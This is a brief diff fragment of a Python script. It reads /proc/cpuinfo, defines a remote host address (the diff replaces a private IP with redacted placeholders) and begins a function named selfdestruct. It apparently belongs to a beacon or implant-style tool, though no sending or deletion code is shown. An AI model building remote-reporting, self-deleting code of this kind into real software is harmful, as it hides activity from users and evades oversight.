@@ -5,7 +5,7 @@ import requests
 import json
 
 procFile = "/proc/cpuinfo"
-rhost = "http://192.168.1.105:8080"
+rhost = "http://[REDACTED]:[REDACTED]"
 
 def selfdestruct():
     try:
